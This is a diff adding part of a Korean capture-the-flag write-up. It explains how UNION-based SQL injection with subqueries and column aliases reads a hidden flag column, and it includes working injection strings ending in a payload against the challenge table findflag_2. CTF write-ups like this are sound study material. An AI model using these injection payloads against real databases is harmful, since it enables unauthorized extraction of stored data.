@@ -108,3 +108,69 @@ pw 컬럼명을 알아내는 건 굉장히 간단했다. **(이걸 왜 생각 �
 
 <br>
 
+
+대망의 플래그 컬럼과 값을 알아내는 방법이다..
+
+우선 rubiya 테이블은 아래와 같다.
+
+<br>
+
+![image](https://user-images.githubusercontent.com/52172169/171363354-e9400109-48fe-47c4-a0db-8a7c521c90b4.png)
+
+<br>
+
+알아둘 점은 union을 통해 하나의 테이블로 출력하고자 할 때, union 뒤쪽에 있는 쿼리의 결과 값은 앞의 쿼리의 결과 값 밑에 붙여저서 출력된다.
+
+flag 컬럼 값을 어떻게 출력하는가 하면 서브쿼리와 alias를 통해 가져올 수 있다.
+
+<br>
+
+예를 들어, rubiya 테이블에 있는 결과 값을 컬럼명을 다르게 해서 가져오고 싶다라고 할 때 아래와 같은 쿼리로 가져올 수 있다.
+: ```select 1,2,3 union SELECT * FROM rubiya```
+
+<br>
+
+![image](https://user-images.githubusercontent.com/52172169/171366590-3f9e47f3-6f77-4747-a0c8-d7b450edf3b0.png)
+
+<br>
+
+따라서 이 쿼리 결과를 테이블로 사용한다면? 결과는 아래와 같다.
+: ```select * from rubiya where id='' union select * from (select 1,2,3 union select * from rubiya) x```
+
+<br>
+
+![image](https://user-images.githubusercontent.com/52172169/171368628-a4c2b5ca-3e47-4605-9f21-2c4eb8b33ef3.png)
+
+<br>
+
+문제에서는 id 컬럼만 보여주는데, id 컬럼은 2번째에 위치해있다. 
+
+따라서 alias를 통해 플래그가 들어있는 위치를 alias를 해준 다음 그 값을 id 컬럼이 위치한 2번째에 넣어주면 된다.
+
+말로는 모르겠으니 직접 보면 먼저 ```1.rubiya 테이블의 값들을 가져올 건데 컬럼명을 1,flag,3으로 가져온 다음 그 결과를 테이블로 사용```하였다.
+
+두 번째로 그 테이블에서 1,flag,3 컬럼명을 가져왔다.
+
+<br>
+
+```select * from rubiya where id='' union select 1,flag,3 from (select 1,2 as flag,3 union select * from rubiya) x```
+
+<br>
+
+![image](https://user-images.githubusercontent.com/52172169/171370059-7fd4a72d-e803-474a-809e-baa12a9e1c84.png)
+
+<br>
+
+이를 이용해서 findflag_2의 값을 가져올 건데 flag가 있을만한 위치를 alias를 해준 다음 그 결과 값을 테이블로 사용해서 2번째 위치에 alias를 넣어서 출력해준다.
+: ```SELECT * FROM findflag_2 where id='' union select 1,flag,3,4,5 from (select 1,2,3,4 flag,5 union select * from findflag_2) x limit 1,1 #```
+
+<br>
+
+그러면 flag 값이 나온다.
+
+이제 id, pw, flag 모두 구했으므로 입력을 해주면 Flag를 구할 수 있다...
+
+## 풀이 출처
+---
+
+Link : <a href="https://posix.tistory.com/27" target="_blank">posix.tistory.com/27</a>
